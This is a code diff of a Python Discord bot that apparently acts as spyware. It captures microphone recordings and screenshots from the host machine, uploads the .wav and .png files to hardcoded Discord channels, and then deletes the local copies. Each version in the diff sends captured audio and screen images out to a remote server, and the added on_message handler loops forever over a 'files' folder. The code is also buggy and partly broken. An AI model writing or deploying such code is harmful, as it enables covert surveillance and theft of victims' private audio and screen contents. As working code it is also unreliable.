@@ -17,36 +17,27 @@ microphone_channel = "1209237919592615937"
 connect_channel = "1209247219874668638"
 
 microphone = Microphone()
-screenshot = Screenshot()
+screenshot = Screenshot()  
 
-async def record_mic():
-    while recording:
-        microphone.record()
-        mic_path = microphone.name
-        if not mic_path:
-            print("Microphone path is empty.")
-            return
-
-        guild = await bot.fetch_guild(guild_id)
-        channel = await guild.fetch_channel(microphone_channel)
-
-        with open(mic_path, 'rb') as screenshot_file:
-            await channel.send(file=discord.File(screenshot_file, mic_path))
-    
-        mic_path = microphone.name   
-        os.remove(mic_path) # COMMENT OUT IF YOU WANT TO KEEP IT
-
-@bot.command("sendMic")
 async def sendMic(ctx):
-    if recording == True:
-        recording = False
-    else:
-        recording = True
-        # ADFWAJJAGWJGA I NEED TO AWAIT IT SO IT DOESNT WORK
+    mic_path = microphone.name
+    if not mic_path:
+        print("Microphone path is empty.")
+        return
+
+    guild = await bot.fetch_guild(guild_id)
+    channel = await guild.fetch_channel(microphone_channel)
+
+    with open(mic_path, 'rb') as screenshot_file:
+        await channel.send(file=discord.File(screenshot_file, mic_path))
+        
+    os.remove(mic_path) # COMMENT OUT IF YOU WANT TO KEEP IT
 
 @bot.command("sendScreen")
 async def sendScreen(ctx):
-    screenshot.printscreen()
+    for file in os.listdir("files"):
+        screenshot_path = file.replace(".wav", "")
+    
     screenshot_path = screenshot.name
     if not screenshot_path:
         print("Screenshot path is empty.")
@@ -73,6 +64,13 @@ async def on_ready():
 
 @bot.event
 async def on_message(message):
-    await bot.process_commands(message)
-   
+    while True:
+        for file in os.listdir("files"):
+            if file.endswith(".png"):
+                await sendScreen(ctx=message)
+        
+        for file in os.listdir("files"):
+            if file.endswith(".wav"):
+                await sendMic(ctx=message)
+
 bot.run(os.getenv("TOKEN"))
